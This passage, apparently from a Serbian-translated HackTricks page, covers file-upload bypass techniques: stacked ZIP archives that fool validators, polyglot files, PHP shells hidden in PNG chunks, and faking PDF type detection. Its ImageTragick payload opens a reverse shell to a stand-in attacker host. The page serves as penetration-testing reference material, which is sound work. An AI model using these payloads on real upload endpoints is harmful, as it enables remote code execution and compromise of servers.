printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Obrazac zloupotrebe
- Napravite benigni arhiv (dozvoljeni tip, npr. PDF) i drugi arhiv koji sadrži blokirano proširenje (npr. `shell.php`).
- Spojite ih: `cat benign.zip evil.zip > combined.zip`.
- Ako server validira jednim parserom (vidi benign.zip), ali raspakuje drugim (obrađuje evil.zip), blokirana datoteka se nađe u putanji za raspakivanje.

## ImageTragic

Otpremite ovaj sadržaj sa ekstenzijom slike kako biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ugradnja PHP Shell u PNG

Ugradnja PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slike. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se obično koriste za resizing i resampling slika, respektivno. Sposobnost ugrađenog PHP shell-a da ostane nepromenjen nakon ovih operacija predstavlja značajnu prednost u određenim slučajevima upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalnu primenu, dostupno je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglotske datoteke

Poliglotske datoteke predstavljaju jedinstven alat u sajber bezbednosti, ponašajući se kao kamaleoni koji mogu validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takve datoteke nisu ograničene na ovo uparivanje; kombinacije kao što su GIF i JS ili PPT i JS su takođe moguće.

Osnovna korisnost poliglotskih datoteka leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove po tipu. Uobičajena praksa u različitim aplikacijama je dozvoljavanje samo određenih tipova fajlova za upload — kao što su JPEG, GIF, ili DOC — kako bi se smanjio rizik koji predstavljaju potencijalno štetni formati (npr. JS, PHP, ili Phar). Međutim, poliglot, usklađujući se sa strukturnim kriterijumima više formata fajlova, može prikriveno zaobići ova ograničenja.

Uprkos svojoj prilagodljivosti, poligloti ipak imaju ograničenja. Na primer, iako poliglot može istovremeno sadržati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog upload-a može zavisiti od politike platforme u pogledu ekstenzija fajlova. Ako je sistem strogo ograničen u pogledu dozvoljenih ekstenzija, sama strukturna dvoličnost poliglota možda neće biti dovoljna da obezbedi njegov upload.

### Otpremaj validne JSON fajlove kao da su PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Sve dok se `%PDF` magic bajtovi nalaze u prvih 1024 bajta, fajl se smatra validnim (get example from post)
- **`pdflib` library**: Ubacite lažni PDF format unutar polja JSON-a tako da biblioteka misli da je u pitanju pdf (get example from post)
- **`file` binary**: Može pročitati do 1048576 bajta iz fajla. Jednostavno napravite JSON veći od toga tako da ne može da parsira sadržaj kao json i onda unutar JSON-a stavite početni deo pravog PDF-a i smatraće da je PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
